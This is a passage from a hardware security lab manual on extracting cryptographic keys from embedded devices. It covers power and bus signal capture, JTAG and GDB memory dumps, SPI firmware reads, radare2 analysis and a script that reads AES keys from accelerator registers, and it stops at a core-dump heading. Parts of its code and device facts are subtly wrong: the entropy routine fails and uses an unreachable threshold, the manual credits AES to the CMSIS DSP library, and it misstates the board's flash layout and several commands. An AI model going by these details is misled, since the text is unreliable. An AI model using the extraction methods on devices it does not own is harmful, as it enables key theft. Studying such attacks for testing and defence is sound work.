# Operational Verification Labs: Cryptography

## Objective & Lab Bench Setup

Modern cryptographic implementations fail not in the mathematics but in the physical substrate upon which they execute. Side-channel leakage, fault injection, implementation vulnerabilities, and key extraction attacks constitute the dominant threat surface for real-world cryptographic systems. This laboratory sequence trains penetration testers and hardware security researchers to probe, capture, and exploit cryptographic implementations at the silicon-firmware boundary where abstract algorithms encounter physical reality.

The operational objective is threefold: first, to develop proficiency in capturing and analyzing cryptographic operations through hardware instrumentation and bus-level signal interception; second, to extract cryptographic material from embedded systems through memory dumping, firmware extraction, and register inspection; third, to induce controlled faults that compromise cryptographic integrity and to verify the exploitability of timing channels, power differentials, and electromagnetic emanations. These exercises assume adversarial access to target hardware—a realistic threat model for supply chain interdiction, physical device compromise, and insider threats.

### Hardware Laboratory Configuration

Establish a controlled hardware bench with the following instrumentation tier. The primary analysis workstation runs a modern Linux distribution (Ubuntu 22.04 LTS or Debian 12) with kernel 5.15 or later to ensure stable USB subsystem operation and contemporary driver support. Install the diagnostic suite with `apt-get install sigrok-cli openocd flashrom binwalk radare2 gdb-multiarch minicom python3-serial python3-cryptography`. Verify Python 3.10 or later is present, as the cryptographic libraries require modern type hints and async primitives.

The physical instrumentation layer consists of a USB logic analyzer capable of sampling at 24 MHz or higher with at least eight digital channels. The Saleae Logic 8, DSLogic Plus, or open-hardware alternatives based on the Cypress FX2LP controller provide sufficient bandwidth for SPI, I2C, and UART protocol decode. Connect the logic analyzer to the workstation via a shielded USB 3.0 cable to minimize ground loop interference and ensure consistent sample clock stability. Position the analyzer within 30 centimeters of the target device to reduce probe capacitance and signal degradation on high-frequency buses.

Deploy a USB-UART bridge for serial console access and bootloader interaction. The FTDI FT232H or CP2102 bridge modules expose standard 3.3V TTL logic levels and integrate cleanly with Linux tty subsystems. Connect the UART adapter to `/dev/ttyUSB0` (verify with `dmesg | tail` after insertion) and configure minicom with `minicom -D /dev/ttyUSB0 -b 115200` to establish an interactive serial console. Disable hardware flow control (press Ctrl-A, Z, O, then navigate to Serial Port Setup and disable RTS/CTS) to prevent spurious handshake failures on minimal embedded UART implementations.

For JTAG and SWD debugging, deploy OpenOCD with a compatible adapter. The ST-Link V2, J-Link EDU, or FTDI-based JTAG adapters provide multi-target support across ARM Cortex-M, MIPS, and RISC-V architectures. Connect the JTAG adapter's TCK, TMS, TDI, TDO, and GND pins to the corresponding test points on the target board, ensuring ground integrity by measuring continuity with a multimeter before applying power. Launch OpenOCD with `openocd -f interface/stlink.cfg -f target/stm32f4x.cfg` for ARM Cortex-M4 targets, adjusting the target configuration file to match the specific microcontroller family.

Firmware extraction requires a SPI flash programmer. The FlashROM utility supports a wide array of USB-based SPI masters, including the FTDI FT2232H Mini Module configured in MPSSE mode. Wire the FT2232H to the target SPI flash chip: AD0 to SCK, AD1 to MOSI, AD2 to MISO, AD3 to CS, with GND shared between programmer and target. Power the target from its own supply rail rather than the programmer's 3.3V output to avoid exceeding current limits and inducing brown-out resets during read operations. Verify the SPI connection with `flashrom -p ft2232_spi:type=232H` to enumerate detected flash chips before attempting read operations.

Construct a stable grounding topology by connecting all instruments to a common ground reference point on the target board, typically the metal chassis or a dedicated GND test pad. Measure ground potential differences between instruments using a multimeter in AC voltage mode; readings exceeding 0.1V AC indicate ground loop current and require shorter ground leads or star-topology rewiring. Position the target device on an anti-static mat and wear a grounded wrist strap to prevent electrostatic discharge damage to CMOS logic.

### Target Device Selection and Preparation

Select representative cryptographic targets that mirror real-world deployment constraints. IoT authentication tokens, embedded payment terminals, secure boot implementations, and hardware security modules provide realistic attack surfaces. For initial skill development, commercial development boards such as the STM32F4 Discovery, ESP32-DevKitC, or Raspberry Pi Pico offer accessible JTAG headers, exposed SPI flash, and reference firmware with known cryptographic primitives. Progress to production devices by desoldering shields, locating test points with a multimeter in continuity mode, and tracing PCB layers under magnification to identify bus signals.

Power the target device from a laboratory bench supply rather than USB to enable current monitoring and controlled voltage manipulation. Set the supply to the device's nominal operating voltage (typically 3.3V for modern embedded systems) with a current limit of 500 mA to prevent damage during short circuits or fault injection. Connect an oscilloscope probe across a 10-ohm shunt resistor in series with the power rail to observe instantaneous current draw; cryptographic operations often exhibit characteristic power signatures visible as transient current spikes correlating with AES rounds or modular exponentiation steps.

Install target firmware that exercises cryptographic operations in a repeatable manner. For ARM Cortex-M targets, compile a minimal test harness using `arm-none-eabi-gcc` that invokes mbedTLS or WolfSSL library functions. A representative test program initializes an AES-128 context, encrypts a fixed plaintext block, and outputs the ciphertext via UART before looping indefinitely. This deterministic behavior enables time-correlated signal capture during the encryption operation. Flash the firmware using OpenOCD with `program firmware.elf verify reset` after establishing a JTAG connection.

Document the target's boot sequence, memory map, and peripheral configuration by analyzing datasheets and reference manuals. Record the SPI flash chip model, capacity, and sector organization for firmware extraction planning. Note the UART baud rate, parity, and stop bit configuration by observing bootloader messages at power-on. Identify the main cryptographic library in use by searching firmware strings with `binwalk -e firmware.bin` followed by `strings -n 8` on the extracted filesystem, looking for version strings like "mbedTLS 2.28.0" or "OpenSSL 1.1.1".

### Verification and Calibration Procedures

Before commencing cryptographic analysis, validate instrumentation functionality through known-good signal sources. Connect the logic analyzer to the target's SPI flash bus and capture a read operation during boot. Launch PulseView (the graphical frontend to sigrok) with `pulseview` and configure the device to sample at 24 MHz across eight channels. Connect channel 0 to SCK, channel 1 to MOSI, channel 2 to MISO, and channel 3 to CS, then trigger on a falling edge of CS with a 1-millisecond capture window. Decode the SPI protocol by adding a protocol decoder (right-click on the signal pane, select Protocol Decoders → SPI) and verify that the captured command bytes match the expected SPI flash instruction set (0x03 for read, 0x9F for JEDEC ID).

Calibrate the UART console by iterating through standard baud rates until coherent text appears. If the console emits garbage characters, measure the actual bit period with the logic analyzer by capturing the TX pin during a known transmission and calculating `baud = 1 / bit_period`. Common embedded systems use 115200, 57600, or 9600 baud with 8N1 framing (8 data bits, no parity, 1 stop bit). Configure minicom to match the measured parameters and verify bidirectional communication by sending a character and observing the echo response.

Test the JTAG connection by reading the target's device ID register. With OpenOCD running, connect via telnet with `telnet localhost 4444` and issue the command `targets` to enumerate detected cores. Execute `mdw 0xE000ED00 4` to read the ARM Cortex-M CPUID register at the System Control Block base address, which returns a 32-bit identifier encoding the processor variant and revision. Cross-reference this value against the manufacturer's documentation to confirm correct target detection. If the JTAG connection fails, verify TCK signal integrity with the logic analyzer by observing the clock waveform during OpenOCD's initial scan sequence; missing clock edges indicate wiring faults or incorrect voltage levels.

Validate the SPI flash programmer by reading the JEDEC ID from an unmodified chip. Execute `flashrom -p ft2232_spi:type=232H` and observe the output for lines reporting detected flash chip manufacturer, model, and capacity. If flashrom reports "No EEPROM/flash device found", verify the SPI wiring with a multimeter in continuity mode and check that the target device is powered. The MISO line should idle high (pulled up internally by the flash chip) when CS is deasserted; if MISO remains low, suspect a short circuit or incorrect pinout.

With instrumentation validated, establish baseline signal captures during non-cryptographic operations. Record SPI bus traffic during a simple GPIO toggle loop to characterize the noise floor and identify any periodic interference from switching regulators or clock oscillators. Capture UART transmissions during boot messages to verify timestamp accuracy and sample rate sufficiency. These baseline captures provide reference waveforms for distinguishing cryptographic operation signatures from background system activity.

## Exercise 1: Live Hardware Probing & Signal Capture

### Objective and Threat Model

This exercise develops proficiency in non-invasive cryptographic operation capture through passive bus monitoring and temporal correlation. The adversary model assumes physical access to a device during normal operation without the ability to modify firmware or halt execution. This scenario mirrors supply chain inspection, field device analysis, and pre-exploitation reconnaissance where altering device behavior would trigger tamper detection or void forensic integrity.

The technical objective is to capture cryptographic operations at the hardware bus level, correlate signal events with application-layer behavior, and extract timing characteristics that reveal algorithmic structure. Successful completion yields annotated waveform captures demonstrating the ability to identify AES encryption rounds, RSA modular exponentiation, and ECDSA signature generation through bus signal morphology and temporal analysis.

### Target Configuration: AES-128 Encryption on ARM Cortex-M4

Deploy a STM32F407 Discovery board running a minimal firmware harness that performs AES-128-CBC encryption in a timed loop. The reference implementation uses the ARM CMSIS DSP library's software AES implementation rather than hardware acceleration to produce clearly observable algorithmic structure in power and timing traces. Compile the following firmware with `arm-none-eabi-gcc -mcpu=cortex-m4 -mthumb -O2 -o aes_test.elf aes_test.c -lm` and flash via OpenOCD.

The firmware source establishes a predictable cryptographic workload. Initialize the AES context with a fixed 128-bit key (sixteen bytes of 0xAA for demonstration purposes, never use fixed keys in production systems). Configure a 1-second timer interrupt using the SysTick peripheral to trigger encryption operations at precise intervals. Within the interrupt handler, encrypt a 16-byte plaintext block consisting of incrementing counter values (0x00, 0x01, 0x02, ..., 0x0F) and transmit the resulting ciphertext over UART at 115200 baud. The incrementing counter ensures each encryption operates on unique plaintext while maintaining deterministic behavior for repeated captures.

Power the Discovery board from a bench supply set to 3.0V with a 500 mA current limit. Insert a 10-ohm current sense resistor between the positive supply rail and the board's VDD pin. Connect an oscilloscope probe across the sense resistor to monitor instantaneous current consumption. Configure the oscilloscope to trigger on the UART TX line's start bit (falling edge) and capture 100 milliseconds of current waveform at 100 MS/s sample rate. This synchronization ensures that the captured power trace temporally aligns with the cryptographic operation, enabling correlation between computational phases and current spikes.

### Signal Capture Procedure: SPI Flash Read During Boot

Begin with a simpler capture target to develop probe placement and trigger configuration skills. Connect the logic analyzer to the SPI flash bus that stores the STM32's bootloader and application firmware. Locate the flash chip on the Discovery board's underside (typically a Winbond W25Q or Macronix MX25 series device in an SOIC-8 package). Identify pin 1 by the chamfered edge or circular indentation on the package, then locate pins by package datasheet: CS (pin 1), SO/MISO (pin 2), WP (pin 3), GND (pin 4), SI/MOSI (pin 5), SCK (pin 6), HOLD (pin 7), VCC (pin 8).

Attach logic analyzer probes using micro-grabber clips or solder short wire segments directly to the flash chip pins for improved signal integrity. Connect channel 0 to SCK (pin 6), channel 1 to MOSI (pin 5), channel 2 to MISO (pin 2), and channel 3 to CS (pin 1). Route the probe ground lead to a nearby ground plane via or the flash chip's GND pin (pin 4). Position probe wires close to the board surface and twist ground leads with signal leads to minimize inductive loop area and reduce electromagnetic interference pickup.

Launch PulseView and configure the logic analyzer for 24 MHz sampling with 1 million samples per channel (41.67 milliseconds capture window). Set the trigger condition to falling edge on channel 3 (CS) with 10% pre-trigger to capture the idle bus state before the transaction begins. Apply power to the Discovery board and observe the boot sequence on the UART console. The STM32's internal bootloader first interrogates the flash chip with a JEDEC ID command (0x9F) followed by read commands (0x03 or 0x0B fast read) to load the application firmware into SRAM.

Initiate capture in PulseView and reset the target board by momentarily grounding the NRST pin. The logic analyzer triggers on the first SPI transaction as the bootloader activates the flash chip select. Stop the capture when the buffer fills and add a SPI protocol decoder by right-clicking in the waveform area, selecting Add protocol decoder, and choosing SPI from the list. Configure the decoder with CPOL=0, CPHA=0 (SPI mode 0), MSB-first bit order, and 8-bit word size. The decoder annotates the raw signal with MOSI and MISO byte values in hexadecimal.

Analyze the decoded SPI traffic to identify the flash read sequence. The initial transaction typically shows MOSI transmitting 0x9F followed by three dummy bytes, with MISO responding with the manufacturer ID (0xEF for Winbond), memory type (0x40 for SPI flash), and capacity code (0x16 for 32 Mbit). Subsequent transactions show read commands starting with 0x03, followed by a 24-bit address (most significant byte first) and continuous data bytes on MISO representing firmware content. Record the base address of the read operation (often 0x08000000 for STM32) and the number of bytes transferred.

Export the captured waveform as a Value Change Dump (VCD) file via PulseView's File menu for offline analysis. Use the sigrok-cli tool to extract raw SPI data with `sigrok-cli -i capture.sr -P spi:clk=0:mosi=1:miso=2:cs=3 -A spi=mosi-data > mosi.txt`. This produces a text file containing all MOSI bytes in chronological order, suitable for correlation with expected firmware binary content. Compare the extracted bytes against the known firmware image by reading the flash chip with flashrom and verifying byte-for-byte correspondence at the observed address range.

### Temporal Correlation: AES Round Timing Extraction

Advance to capturing the cryptographic workload itself by monitoring the current consumption waveform during AES encryption. Connect the oscilloscope probe across the 10-ohm sense resistor in the power rail and configure the scope to trigger on the UART TX line start bit. Set the time base to 10 milliseconds per division with vertical scale at 5 mA per division. The oscilloscope's math function computes instantaneous power by multiplying the voltage across the sense resistor (channel 1) by the supply voltage (constant 3.0V): P = V_sense × V_supply / R_sense = V_sense × 3.0 / 10.

Start the firmware and observe the oscilloscope display. Each encryption cycle produces a distinctive power signature beginning approximately 10 microseconds after the UART start bit (the delay corresponds to the interrupt handler's entry latency and AES context setup). The encryption phase spans roughly 1-2 milliseconds for a software AES-128 implementation at 168 MHz CPU clock and exhibits a periodic structure reflecting the ten AES rounds (initial round, eight main rounds, final round).

Increase the oscilloscope time base resolution to 100 microseconds per division and zoom into a single encryption operation. The power trace shows ten prominent peaks corresponding to the SubBytes, ShiftRows, MixColumns, and AddRoundKey transformations in each AES round. The Hamming weight of intermediate state bytes correlates with instantaneous current draw through the CMOS switching power relationship P_switching = α × C_load × V_dd² × f_clock, where α represents the activity factor determined by the number of transistors toggling. When processing high-Hamming-weight bytes (many 1 bits), more internal nodes charge and discharge, increasing the observable current spike amplitude.

Enable the oscilloscope's FFT function to transform the time-domain power trace into frequency domain. The resulting spectrum reveals the fundamental round frequency (approximately 500 Hz for a 2-millisecond total encryption time with ten rounds) and harmonic components at integer multiples. This spectral signature provides a fingerprint for detecting AES operations in complex firmware executing multiple concurrent tasks. Record the time-domain waveform by exporting to CSV format via the oscilloscope's USB port, capturing at least 100 encryption cycles to accumulate statistical confidence for subsequent analysis.

### Advanced Capture: Correlating Bus Traffic with Cryptographic Operations

Simultaneously capture SPI flash access, UART output, and power consumption to establish multi-channel correlation. This configuration enables tracing the complete information flow from key material stored in flash, through encryption execution visible in power signatures, to ciphertext transmission via UART. Configure the logic analyzer to sample eight channels at 24 MHz: channels 0-3 capture the SPI bus (SCK, MOSI, MISO, CS), channel 4 monitors UART TX, channels 5-6 remain unused, and channel 7 connects to the oscilloscope's external trigger output.

Synchronize the oscilloscope and logic analyzer by configuring the oscilloscope to output a TTL pulse on its auxiliary trigger output whenever it triggers on the UART start bit. Connect this trigger output to logic analyzer channel 7 and configure the analyzer to trigger on a rising edge on that channel. This arrangement ensures both instruments capture temporally aligned data with the oscilloscope trigger event marking time zero in both recordings.

Modify the target firmware to read the AES key from SPI flash rather than using a compiled constant. The enhanced firmware reads 16 bytes from flash address 0x08080000 during initialization using the STM32's memory-mapped flash interface, copies the key material into SRAM, and subsequently uses it for all encryption operations. Recompile and flash the modified firmware, then use flashrom to write a known key pattern to the designated flash region with `flashrom -p stlink_spi -w key_region.bin -N --ifd -i bios` (adjust parameters for non-Intel flash chips).

Initiate synchronized capture by arming both instruments, then reset the target device. The logic analyzer records the boot sequence SPI read transactions that include the key material fetch, the oscilloscope captures the power waveform during key loading and subsequent encryption, and the UART decoder within the logic analyzer captures the ciphertext output. Post-process the logic analyzer data by extracting the SPI bytes at the key fetch address and comparing against the known key written with flashrom. Verify that the captured key bytes exactly match the flashrom-written data, confirming successful key extraction through passive bus monitoring.

Correlate the oscilloscope power trace with the SPI and UART events by aligning timestamps. The logic analyzer's channel 7 trigger pulse marks the start of encryption at time T=0 in both data sets. The SPI key read occurs earlier during the boot sequence at a negative relative time (pre-trigger data preserved by the logic analyzer's 50% pre-trigger setting). The UART ciphertext transmission begins at approximately T=2 milliseconds, shortly after the encryption power signature completes. Export all three data streams (SPI bytes, power waveform, UART bytes) and plot them on a common time axis using Python with matplotlib and pandas libraries.

This multi-channel capture demonstrates the complete attack chain for cryptographic material extraction: identifying where keys reside in non-volatile storage through firmware analysis, capturing the key read operation at boot via SPI bus monitoring, confirming key usage through power analysis correlation with encryption timing, and verifying the encryption output via UART interception. The captured data provides ground truth for validating cryptanalysis results and training machine learning models for automated key extraction from power traces.

### Signal Integrity Considerations and Troubleshooting

If captured SPI waveforms exhibit excessive noise or decode errors, reduce the logic analyzer sampling rate to 8 MHz and verify that ground leads are short (< 5 cm) and twisted with their respective signal leads. High-frequency digital edges on unshielded probe wires radiate electromagnetic interference that couples into adjacent probes, causing spurious transitions. Route probe wires away from switching power supplies and WiFi antennas, which emit broadband RF noise spanning 2.4 GHz that aliases down into the sampling bandwidth through nonlinear mixer effects in the logic analyzer's input protection diodes.

For UART captures with sporadic framing errors or incorrect baud rate detection, measure the actual TX bit timing with the logic analyzer running at maximum sampling rate (100-200 MHz if available). Zoom into a single character transmission and measure the duration between the start bit falling edge and the first data bit transition. Divide 1 by this duration to compute the actual baud rate; embedded systems often generate baud clocks by dividing the CPU clock with integer prescalers that produce rates slightly offset from nominal values (e.g., 115385 baud instead of 115200).

If the oscilloscope power trace shows excessive noise obscuring the cryptographic signature, verify that the sense resistor is soldered directly in the power path rather than connected via breadboard jumper wires, which introduce parasitic inductance that rings at high frequencies. Increase the sense resistor value to 22 or 47 ohms to amplify the voltage signal, at the cost of increased voltage drop (check that the target device operates correctly at the reduced supply voltage). Apply the oscilloscope's bandwidth limit filter (20 MHz setting) to suppress high-frequency switching noise while preserving the lower-frequency power signatures corresponding to algorithmic rounds.

When simultaneous multi-instrument captures produce misaligned timestamps, verify that all instruments and the target device share a common ground reference by measuring AC voltage between ground connections with a multimeter. Readings exceeding 50 mV AC indicate ground loop currents that introduce timing skew as signals reference different ground potentials. Establish a star ground topology by connecting all instrument grounds to a single point on the target board, typically a mounting screw or dedicated ground pad.

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

### Objective and Adversarial Context

This exercise transitions from passive observation to active interrogation of the target's memory space, debugging interfaces, and firmware storage. The threat model assumes physical access with the ability to halt execution, attach debugging tools, and read arbitrary memory regions, but without the capability to modify firmware on the device's internal flash (a constraint imposed by read-out protection mechanisms common in modern microcontrollers). This scenario represents post-compromise forensics, supply chain analysis of locked devices, and preparation for subsequent exploit development.

The technical goal is to extract cryptographic key material, identify cryptographic library functions through firmware reverse engineering, and dump the complete memory space for offline analysis. Successful completion yields a full firmware image, extracted cryptographic constants, and annotated disassembly of cryptographic routines suitable for vulnerability analysis.

### JTAG Memory Inspection and Register Enumeration

Establish a JTAG connection to the STM32F407 target using OpenOCD and an ST-Link V2 adapter. Connect the adapter's JTAG interface: SWDIO to target PA13, SWCLK to target PA14, GND to target ground, and optionally NRST to target reset pin for improved connection reliability. Launch OpenOCD with `openocd -f interface/stlink.cfg -f target/stm32f4x.cfg` and observe the initialization sequence in the terminal output. Successful connection produces messages indicating TAP detection, CPU identification (ARM Cortex-M4 CPUID), and breakpoint unit configuration.

Open a second terminal and connect to OpenOCD's telnet interface with `telnet localhost 4444`. Issue the command `halt` to pause CPU execution, freezing the target's program counter at its current instruction. Query the current register state with `reg` to display all ARM Cortex-M core registers (R0-R12, SP, LR, PC, xPSR). The PC (program counter) value indicates the current execution address; disassemble surrounding instructions with `mdw $pc 16` to display 16 words (64 bytes) of memory at the current program counter location.

Navigate the memory map by reading defined regions. The STM32F407's SRAM base address is 0x20000000, internal flash resides at 0x08000000, and peripheral registers occupy 0x40000000 through 0x5FFFFFFF. Read the firmware vector table with `mdw 0x08000000 64` to display the first 256 bytes of flash, which contain the initial stack pointer (first word) and reset handler address (second word). Cross-reference the reset handler against the firmware source to confirm correct symbol resolution.

Locate cryptographic key material by searching SRAM for characteristic byte patterns. AES keys often appear as 16, 24, or 32-byte sequences with high entropy (near-uniform byte value distribution). Use OpenOCD's `find` command to search memory: `find /w 0x20000000 0x2001FFFF 0xAABBCCDD` searches SRAM from 0x20000000 to 0x2001FFFF for the 32-bit word 0xAABBCCDD. For a more sophisticated search, dump the entire SRAM region with `dump_image sram.bin 0x20000000 0x20000` (captures 128 KB of SRAM) and analyze the binary file with custom Python scripts that compute byte entropy and identify regions matching key schedule expansion patterns.

Inspect the ARM Cortex-M's Memory Protection Unit (MPU) configuration to identify protected memory regions that might contain sensitive cryptographic state. Read the MPU type register at 0xE000ED90 with `mdw 0xE000ED90` to determine if the MPU is present and how many regions are supported. If the MPU is enabled, read the region configuration registers starting at 0xE000ED9C to enumerate base addresses and access permissions. A read-protected region suggests intentional isolation of cryptographic material, meriting detailed analysis.

### Firmware Extraction via SPI Flash Dumping

Extract the complete firmware image from the external SPI flash chip to enable offline reverse engineering and cryptographic library identification. Power down the target board and disconnect all debugger interfaces to prevent bus contention. Connect the FTDI FT2232H SPI programmer as described in the lab setup section: AD0 to flash SCK, AD1 to MOSI, AD2 to MISO, AD3 to CS, with shared ground.

Power the target from the bench supply at nominal voltage (3.3V for most embedded systems) and verify the SPI connection with `flashrom -p ft2232_spi:type=232H`. The output should identify the flash chip manufacturer, model, and capacity. If flashrom reports "No EEPROM/flash device found", verify wiring continuity with a multimeter and confirm that the target device is powered (some flash chips require VCC even when accessed externally).

Read the entire flash contents with `flashrom -p ft2232_spi:type=232H -r firmware_dump.bin`. This operation takes 30-60 seconds for an 8 MB flash chip at typical SPI clock speeds (1-2 MHz). Flashrom displays a progress bar and verifies the read by computing a checksum. Upon completion, verify the dump integrity by repeating the read operation and comparing the two files with `cmp firmware_dump.bin firmware_dump2.bin`; identical files produce no output, while differences indicate read errors or unstable connections.

Analyze the firmware dump with binwalk to identify embedded filesystem structures and compressed regions: `binwalk -e firmware_dump.bin`. Binwalk scans for magic byte signatures corresponding to common file formats (LZMA compressed data, SquashFS filesystem, U-Boot images) and extracts them into a subdirectory. Navigate the extracted filesystem and locate cryptographic libraries, typically found in `/lib` or `/usr/lib` directories. Common library filenames include `libmbedtls.so`, `libssl.so`, or `libwolfssl.so`.

Search the firmware for cryptographic constants and key material using custom Python scripts. AES S-box tables consist of 256-byte lookup tables with distinctive byte patterns (the first few bytes are 0x63, 0x7C, 0x77, 0x7B for the forward S-box). RSA public exponents commonly use the value 65537 (0x010001 in hexadecimal). Elliptic curve parameters for standard curves like secp256r1 appear as 32-byte constants matching the curve prime modulus. Develop a Python script that scans the firmware binary searching for these patterns:

```python
#!/usr/bin/env python3
import sys

def find_aes_sbox(data):
    """Search for AES forward S-box in binary data."""
    sbox_start = bytes([0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5])
    offset = data.find(sbox_start)
    if offset != -1:
        print(f"AES S-box candidate at offset 0x{offset:08x}")
        print("S-box bytes:", data[offset:offset+16].hex())
    return offset

def find_rsa_exponent(data):
    """Search for common RSA public exponent 65537."""
    exponent = bytes([0x01, 0x00, 0x01])
    offset = 0
    offsets = []
    while True:
        offset = data.find(exponent, offset)
        if offset == -1:
            break
        if offset % 4 == 0:
            print(f"RSA exponent candidate at offset 0x{offset:08x}")
        offsets.append(offset)
        offset += 1
    return offsets

def compute_entropy(block):
    """Compute Shannon entropy of a byte block."""
    if len(block) == 0:
        return 0
    freq = [0] * 256
    for byte in block:
        freq[byte] += 1
    entropy = 0
    for count in freq:
        if count > 0:
            p = count / len(block)
            entropy -= p * (p.bit_length() - 1 if p > 0 else 0)
    return entropy

def find_high_entropy_regions(data, block_size=16, threshold=7.5):
    """Locate blocks with entropy exceeding threshold."""
    regions = []
    for offset in range(0, len(data) - block_size, block_size):
        block = data[offset:offset+block_size]
        entropy = compute_entropy(block)
        if entropy > threshold:
            regions.append((offset, entropy))
    return regions

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <firmware.bin>")
        sys.exit(1)
    
    with open(sys.argv[1], 'rb') as f:
        firmware = f.read()
    
    print(f"Firmware size: {len(firmware)} bytes")
    print("\nSearching for cryptographic constants...")
    
    find_aes_sbox(firmware)
    find_rsa_exponent(firmware)
    
    print("\nHigh-entropy regions (potential key material):")
    regions = find_high_entropy_regions(firmware, block_size=32, threshold=7.8)
    for offset, entropy in regions[:20]:
        print(f"  Offset 0x{offset:08x}: entropy={entropy:.2f}")
        print(f"    Data: {firmware[offset:offset+32].hex()}")
```

Run the script with `python3 crypto_constants.py firmware_dump.bin` to identify candidate cryptographic structures. Cross-reference identified offsets against the firmware's disassembly to locate the functions that access these constants, revealing the cryptographic library entry points.

### Live Memory Dumping via GDB and OpenOCD

For targets with active execution and changing cryptographic state, use GDB to attach to the running process and dump memory dynamically. OpenOCD's GDB server listens on TCP port 3333 by default, providing a standard GDB remote protocol interface. Launch `gdb-multiarch` (supports multiple architectures including ARM) and connect with `target extended-remote localhost:3333`.

Load symbol information if available by specifying the ELF firmware file: `file firmware.elf`. GDB parses the symbol table and enables symbolic debugging, allowing commands like `print aes_key` to display variable contents by name rather than address. If symbols are not available (production firmware without debug information), rely on memory address inspection derived from reverse engineering the firmware binary.

Set a breakpoint at the AES encryption function entry point. If symbols exist, use `break aes_encrypt`. Without symbols, disassemble the firmware in radare2 to locate the encryption function (identifiable by its characteristic S-box table accesses), note its address, and set a breakpoint manually with `break *0x08001234`. Resume execution with `continue` and observe the target's operation via UART console. When the breakpoint triggers, GDB halts execution and displays the current instruction.

Inspect function arguments and local variables. ARM calling convention passes the first four arguments in registers R0-R3, with additional arguments on the stack. Display registers with `info registers` or individual register contents with `print $r0` (prints R0 in decimal), `x/x $r0` (hexadecimal), or `x/16xb $r0` (16 bytes starting at address in R0). For the AES encrypt function, R0 typically points to the input plaintext buffer, R1 to the output ciphertext buffer, and R2 to the key schedule structure. Dump these memory regions with `dump binary memory plaintext.bin $r0 $r0+16` and similarly for key schedule (typically 176 bytes for AES-128).

Single-step through the encryption function with `stepi` (step one instruction) while monitoring register and memory state. After each S-box lookup or round key XOR operation, dump the intermediate AES state to observe the algorithm's progression. Construct a complete encryption trace by scripting GDB with Python extensions:

```python
import gdb

class AESTracer(gdb.Command):
    """Trace AES encryption round by round."""
    
    def __init__(self):
        super(AESTracer, self).__init__("aes-trace", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Assume AES state is in memory pointed to by R0
        state_ptr = int(gdb.parse_and_eval("$r0"))
        print(f"AES state at 0x{state_ptr:08x}")
        
        for round_num in range(11):
            input(f"\nPress Enter to step through round {round_num}...")
            # Step through one round (approximately 40 instructions)
            for _ in range(40):
                gdb.execute("stepi", to_string=True)
            
            # Dump current state
            inferior = gdb.selected_inferior()
            state_bytes = inferior.read_memory(state_ptr, 16)
            print(f"Round {round_num} output: {state_bytes.tobytes().hex()}")

AESTracer()
```

Save this script to `aes_tracer.py` and load it in GDB with `source aes_tracer.py`. At the AES function breakpoint, run `aes-trace` to interactively step through encryption rounds. This technique exposes the internal AES state transformations, enabling validation of suspected key recovery attacks and identification of implementation vulnerabilities such as missing round key zeroing after use.

### Register-Level Cryptographic Accelerator Interrogation

Modern microcontrollers embed hardware cryptographic accelerators (AES, SHA, RSA coprocessors) that perform operations without explicit memory-visible intermediate states. Interrogate these accelerators by reading their control and data registers directly. The STM32F4 series includes a hardware AES/DES/TDES accelerator at base address 0x50060000 (CRYP peripheral).

Halt the target during an encryption operation and read the CRYP registers via OpenOCD. The CRYP_CR (control register) at offset 0x00 indicates the current algorithm mode and operation (encrypt/decrypt). The CRYP_KEYR registers (0x20-0x2C for AES-128) hold the active key material loaded into the accelerator. Read these registers with `mdw 0x50060020 4` to dump the four 32-bit words comprising the 128-bit key.

For AES-256 operations, the key spans eight words (CRYP_KEYR0-KEYR7 at offsets 0x20-0x3C). The CRYP_IVR registers hold the initialization vector for CBC/CTR modes. The CRYP_DIN and CRYP_DOUT registers (0x08 and 0x0C) contain the input plaintext and output ciphertext, readable only during active processing when the CRYP_SR (status register) indicates busy state.

Develop a shell script that automates hardware accelerator register dumping:

```bash
#!/bin/bash
# Dump STM32F4 CRYP peripheral registers via OpenOCD telnet interface

OPENOCD_HOST="localhost"
OPENOCD_PORT="4444"

(
  echo "halt"
  sleep 0.2
  echo "mdw 0x50060000 1"    # CRYP_CR (control register)
  echo "mdw 0x50060004 1"    # CRYP_SR (status register)
  echo "mdw 0x50060020 4"    # CRYP_KEYR0-3 (AES key)
  echo "mdw 0x50060030 4"    # CRYP_IVR0-3 (initialization vector)
  echo "mdw 0x50060008 1"    # CRYP_DIN (input data)
  echo "mdw 0x5006000C 1"    # CRYP_DOUT (output data)
  echo "resume"
  echo "exit"
) | nc $OPENOCD_HOST $OPENOCD_PORT > cryp_dump.txt

echo "Register dump saved to cryp_dump.txt"
grep "0x50060020" cryp_dump.txt | awk '{print $2, $3, $4, $5}' | \
  xxd -r -p | xxd -p -c16
```

Execute the script with `bash dump_cryp.sh` while the target performs hardware-accelerated encryption. The script halts the CPU, reads CRYP registers, resumes execution, and parses the key material from OpenOCD's output. This technique bypasses software-based key obfuscation since the hardware accelerator requires plaintext keys loaded into its registers.

### Firmware Reverse Engineering with Radare2

Disassemble the extracted firmware to locate cryptographic library functions and understand key handling logic. Load the firmware dump into radare2 with `r2 -a arm -b 32 -m 0x08000000 firmware_dump.bin`, specifying ARM architecture, 32-bit mode, and the base load address matching the STM32's flash mapping. Radare2 analyzes the binary and constructs a control flow graph.

Identify the entry point by reading the reset vector from the firmware's vector table. The second word (offset 0x04) contains the reset handler address with the Thumb mode bit set (LSB=1). Display this vector with `pxw 8 @ 0x08000000` and note the reset handler address. Seek to this address with `s 0x08001234` (use the actual address from the vector table, clearing the Thumb bit) and disassemble with `pdf @ entry0`.

Search for cryptographic constants to locate library code. Use radare2's search commands: `/x 637c777bf26b6fc5` searches for the AES forward S-box signature. When a match is found, radare2 displays the offset. Seek to that location and analyze surrounding code with `pdf @ hit0_0` to disassemble the function that references the S-box. This function is typically `aes_encrypt` or a similar entry point.

Identify the key schedule expansion routine by tracing cross-references from the S-box constant. Use `axt @ hit0_0` (analyze cross-references to) to list all functions that access the S-box address. The key schedule function performs repeated S-box lookups during round key derivation. Disassemble suspect functions and look for characteristic patterns: a loop iterating ten times (for AES-128), S-box table lookups, and XOR operations with round constants (0x01, 0x02, 0x04, 0x08, etc.).

Export the disassembly with annotations for offline study: `pdfj > aes_disasm.json` produces JSON-formatted disassembly including instruction mnemonics, operands, and basic block relationships. Process this JSON with Python scripts to generate control flow diagrams or extract operand constants for differential analysis.

### Key Recovery from Core Dumps

